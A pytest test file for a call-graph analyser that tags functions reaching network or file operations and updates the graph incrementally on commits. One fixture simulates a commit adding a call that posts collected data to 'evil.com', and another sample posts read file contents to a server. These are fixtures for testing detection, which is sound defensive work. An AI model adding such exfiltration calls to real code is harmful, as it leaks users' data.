import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.analysis.call_graph import FuncNode, CallEdge, EvolvingCallGraph


def test_empty_graph():
    g = EvolvingCallGraph()
    assert len(g.nodes) == 0
    assert len(g.edges) == 0


def test_add_node():
    g = EvolvingCallGraph()
    node = FuncNode(
        key="test.py:foo",
        file_path="test.py",
        name="foo",
        qualified_name="foo",
        start_line=1,
        end_line=3,
        source_hash="abc123",
    )
    g.add_node(node)
    assert "test.py:foo" in g.nodes
    assert g.nodes["test.py:foo"].name == "foo"
    assert g.nodes["test.py:foo"].categories == set()


def test_add_edge():
    g = EvolvingCallGraph()
    g.add_node(FuncNode("a.py:f", "a.py", "f", "f", 1, 2, "h1"))
    g.add_node(FuncNode("b.py:g", "b.py", "g", "g", 1, 2, "h2"))
    edge = CallEdge("a.py:f", "b.py:g", 3, is_external=False)
    g.add_edge(edge)
    assert len(g.edges["a.py:f"]) == 1
    assert g.edges["a.py:f"][0].callee_key == "b.py:g"
    assert "b.py:g" in g.reverse_edges
    assert g.reverse_edges["b.py:g"] == ["a.py:f"]


def test_external_edge():
    g = EvolvingCallGraph()
    g.add_node(FuncNode("a.py:f", "a.py", "f", "f", 1, 2, "h1"))
    edge = CallEdge("a.py:f", "EXTERNAL:requests.post", 1, is_external=True)
    g.add_edge(edge)
    assert g.edges["a.py:f"][0].is_external
    assert g.edges["a.py:f"][0].callee_name == "requests.post"


def test_remove_file_nodes():
    g = EvolvingCallGraph()
    g.add_node(FuncNode("a.py:f", "a.py", "f", "f", 1, 2, "h1"))
    g.add_node(FuncNode("a.py:g", "a.py", "g", "g", 3, 4, "h2"))
    g.add_node(FuncNode("b.py:h", "b.py", "h", "h", 1, 2, "h3"))
    g.add_edge(CallEdge("a.py:f", "a.py:g", 2))
    g.add_edge(CallEdge("b.py:h", "a.py:f", 1))

    removed = g.remove_file_nodes("a.py")
    assert set(removed) == {"a.py:f", "a.py:g"}
    assert "a.py:f" not in g.nodes
    assert "a.py:g" not in g.nodes
    assert "b.py:h" in g.nodes
    assert len(g.edges.get("b.py:h", [])) == 0


# ══════════════════════════════════════════
# Task 02: Tree-sitter parser tests
# ══════════════════════════════════════════

from src.analysis.call_graph import parse_file_functions, parse_file_calls

SAMPLE_1 = '''
import os
from pathlib import Path

class Scanner:
    def __init__(self, path):
        self.path = path

    def run(self):
        files = os.listdir(self.path)
        self._process(files)

    def _process(self, files):
        for f in files:
            data = Path(f).read_text()
            self._send(data)

    def _send(self, data):
        requests.post("https://example.com/api", data=data)
'''


def test_parse_functions_extracts_all():
    funcs = parse_file_functions("test.py", SAMPLE_1)
    keys = {f.key for f in funcs}
    assert "test.py:Scanner.__init__" in keys
    assert "test.py:Scanner.run" in keys
    assert "test.py:Scanner._process" in keys
    assert "test.py:Scanner._send" in keys
    assert len(funcs) == 4


def test_parse_functions_has_line_info():
    funcs = parse_file_functions("test.py", SAMPLE_1)
    send_func = next(f for f in funcs if f.name == "_send")
    assert send_func.start_line > 0
    assert send_func.end_line >= send_func.start_line


def test_parse_functions_has_source_hash():
    funcs = parse_file_functions("test.py", SAMPLE_1)
    for f in funcs:
        assert len(f.source_hash) == 64


def test_parse_calls_locates_call_sites():
    funcs = parse_file_functions("test.py", SAMPLE_1)
    edges = parse_file_calls("test.py", SAMPLE_1, funcs)

    run_edges = [e for e in edges if e.caller_key == "test.py:Scanner.run"]
    callee_keys = [e.callee_key for e in run_edges]
    assert "EXTERNAL:os.listdir" in callee_keys
    assert "test.py:Scanner._process" in callee_keys


def test_parse_calls_self_method_resolution():
    funcs = parse_file_functions("test.py", SAMPLE_1)
    edges = parse_file_calls("test.py", SAMPLE_1, funcs)

    process_edges = [e for e in edges if e.caller_key == "test.py:Scanner._process"]
    callee_keys = [e.callee_key for e in process_edges]
    assert any("read_text" in k for k in callee_keys)
    assert "test.py:Scanner._send" in callee_keys


MODULE_LEVEL_SAMPLE = '''
def foo():
    bar()

def bar():
    baz()

def baz():
    pass
'''


def test_parse_calls_resolves_local_functions():
    funcs = parse_file_functions("mod.py", MODULE_LEVEL_SAMPLE)
    edges = parse_file_calls("mod.py", MODULE_LEVEL_SAMPLE, funcs)

    foo_edges = [e for e in edges if e.caller_key == "mod.py:foo"]
    assert any(e.callee_key == "mod.py:bar" for e in foo_edges)

    bar_edges = [e for e in edges if e.caller_key == "mod.py:bar"]
    assert any(e.callee_key == "mod.py:baz" for e in bar_edges)


# ══════════════════════════════════════════
# Task 06: Entry point detection tests
# ══════════════════════════════════════════

ENTRY_SAMPLE = '''
from flask import Flask
app = Flask(__name__)

@app.route("/api/data")
def api_handler():
    return collect_data()

@celery.task
def background_job():
    process_items()

@click.command()
def cli_tool():
    run_scan()

def plain_helper():
    return "just a helper"
'''


def test_entry_point_detection_decorators():
    funcs = parse_file_functions("test.py", ENTRY_SAMPLE)
    func_map = {f.qualified_name: f for f in funcs}

    assert func_map["api_handler"].is_entry
    assert func_map["background_job"].is_entry
    assert func_map["cli_tool"].is_entry
    assert not func_map["plain_helper"].is_entry


ENTRY_THREAD_SAMPLE = '''
import threading

class Scanner:
    def start(self):
        t = threading.Thread(target=self._worker)
        t.start()

    def _worker(self):
        while True:
            do_work()

    def normal_method(self):
        return 42
'''


def test_entry_point_thread_target():
    funcs = parse_file_functions("test.py", ENTRY_THREAD_SAMPLE)
    func_map = {f.qualified_name: f for f in funcs}

    assert func_map["Scanner.start"].is_entry
    assert not func_map["Scanner.normal_method"].is_entry


ENTRY_SCHEDULED_SAMPLE = '''
@scheduled.every(30).minutes
def periodic_scan():
    check_files()

@repeat(interval=60)
def repeated_task():
    cleanup()

def utility():
    pass
'''


def test_entry_point_scheduled():
    funcs = parse_file_functions("test.py", ENTRY_SCHEDULED_SAMPLE)
    func_map = {f.qualified_name: f for f in funcs}

    assert func_map["periodic_scan"].is_entry
    assert func_map["repeated_task"].is_entry
    assert not func_map["utility"].is_entry


# ══════════════════════════════════════════
# Task 03: build_full cross-file tests
# ══════════════════════════════════════════

import tempfile

FULL_TEST_MAIN = '''
import helper

def run():
    data = helper.collect()
    helper.send(data)
'''

FULL_TEST_HELPER = '''
import requests

def collect():
    return {"info": "test"}

def send(data):
    requests.post("https://example.com", json=data)
'''


def test_build_full_from_directory():
    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "main.py"), "w") as f:
            f.write(FULL_TEST_MAIN)
        with open(os.path.join(tmpdir, "helper.py"), "w") as f:
            f.write(FULL_TEST_HELPER)

        g = EvolvingCallGraph()
        g.build_full(tmpdir)

        assert "main.py:run" in g.nodes
        assert "helper.py:collect" in g.nodes
        assert "helper.py:send" in g.nodes

        run_edges = g.edges.get("main.py:run", [])
        callee_keys = [e.callee_key for e in run_edges]
        assert "helper.py:collect" in callee_keys
        assert "helper.py:send" in callee_keys

        send_edges = g.edges.get("helper.py:send", [])
        ext_calls = [e for e in send_edges if e.is_external]
        assert any("requests.post" in e.callee_key for e in ext_calls)


CROSS_FILE_MAIN = '''
from helper import send_data

def run():
    send_data({"key": "value"})
'''

CROSS_FILE_HELPER = '''
import requests

def send_data(payload):
    requests.post("https://api.example.com", json=payload)
'''


def test_build_full_cross_file_resolution():
    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "main.py"), "w") as f:
            f.write(CROSS_FILE_MAIN)
        with open(os.path.join(tmpdir, "helper.py"), "w") as f:
            f.write(CROSS_FILE_HELPER)

        g = EvolvingCallGraph()
        g.build_full(tmpdir)

        run_edges = g.edges.get("main.py:run", [])
        assert any(e.callee_key == "helper.py:send_data" for e in run_edges)


# ══════════════════════════════════════════
# Task 04: Category propagation tests
# ══════════════════════════════════════════

def test_category_propagation_simple():
    g = EvolvingCallGraph()
    g.add_node(FuncNode("test.py:run", "test.py", "run", "run", 1, 3, "aaa"))
    g.add_node(FuncNode("test.py:_send", "test.py", "_send", "_send", 5, 7, "bbb"))
    g.add_edge(CallEdge("test.py:run", "test.py:_send", 6))
    g.add_edge(CallEdge("test.py:_send", "EXTERNAL:requests.post", 7, is_external=True))

    changed = g.propagate_categories()
    assert "network" in g.nodes["test.py:_send"].categories
    assert "network" in g.nodes["test.py:run"].categories
    assert "test.py:run" in changed


def test_category_propagation_no_match():
    g = EvolvingCallGraph()
    g.add_node(FuncNode("test.py:fmt", "test.py", "fmt", "fmt", 1, 2, "abc"))
    g.add_edge(CallEdge("test.py:fmt", "EXTERNAL:str", 1, is_external=True))
    g.propagate_categories()
    assert len(g.nodes["test.py:fmt"].categories) == 0


def test_category_propagation_multi_category():
    g = EvolvingCallGraph()
    g.add_node(FuncNode("test.py:do", "test.py", "do", "do", 1, 6, "h1"))
    g.add_edge(CallEdge("test.py:do", "EXTERNAL:socket.connect", 2, is_external=True))
    g.add_edge(CallEdge("test.py:do", "EXTERNAL:os.remove", 3, is_external=True))
    g.propagate_categories()
    assert "network" in g.nodes["test.py:do"].categories
    assert "file" in g.nodes["test.py:do"].categories


def test_category_propagation_skips_logger():
    g = EvolvingCallGraph()
    g.add_node(FuncNode("test.py:run", "test.py", "run", "run", 1, 5, "h1"))
    g.add_edge(CallEdge("test.py:run", "EXTERNAL:logger.info", 2, is_external=True))
    g.add_edge(CallEdge("test.py:run", "EXTERNAL:json.dumps", 3, is_external=True))
    g.propagate_categories()
    assert len(g.nodes["test.py:run"].categories) == 0


# ══════════════════════════════════════════
# Task 05: Incremental commit update tests
# ══════════════════════════════════════════

INIT_MAIN = '''
import helper

def run():
    return helper.collect()
'''

INIT_HELPER = '''
def collect():
    return {"data": 1}
'''

UPDATED_MAIN = '''
import helper
import requests

def run():
    data = helper.collect()
    requests.post("https://evil.com", json=data)
'''


def test_apply_commit_updates_changed_file():
    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "main.py"), "w") as f:
            f.write(INIT_MAIN)
        with open(os.path.join(tmpdir, "helper.py"), "w") as f:
            f.write(INIT_HELPER)

        g = EvolvingCallGraph()
        g.build_full(tmpdir)
        assert "main.py:run" in g.nodes
        old_hash = g.nodes["main.py:run"].source_hash

        # Simulate commit that modifies main.py
        with open(os.path.join(tmpdir, "main.py"), "w") as f:
            f.write(UPDATED_MAIN)

        delta = g.apply_commit(tmpdir, {"main.py"})

        assert len(delta["removed_nodes"]) >= 1
        assert len(delta["added_nodes"]) >= 1
        assert g.nodes["main.py:run"].source_hash != old_hash

        # New edge to requests.post
        run_edges = g.edges.get("main.py:run", [])
        ext_calls = [e for e in run_edges if e.is_external]
        assert any("requests.post" in e.callee_key for e in ext_calls)

        # helper.py untouched
        assert "helper.py:collect" in g.nodes

        # Categories propagated
        assert "network" in g.nodes["main.py:run"].categories


def test_apply_commit_only_reparses_changed():
    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "a.py"), "w") as f:
            f.write("def f(): pass\n")
        with open(os.path.join(tmpdir, "b.py"), "w") as f:
            f.write("def g(): pass\n")

        g = EvolvingCallGraph()
        g.build_full(tmpdir)
        assert "a.py:f" in g.nodes
        assert "b.py:g" in g.nodes

        with open(os.path.join(tmpdir, "b.py"), "w") as f:
            f.write("def g(): import os; os.system('ls')\n")

        delta = g.apply_commit(tmpdir, {"b.py"})
        assert "a.py:f" in g.nodes
        assert "b.py:g" in g.nodes
        assert len(delta["removed_nodes"]) == 1
        assert len(delta["added_nodes"]) == 1
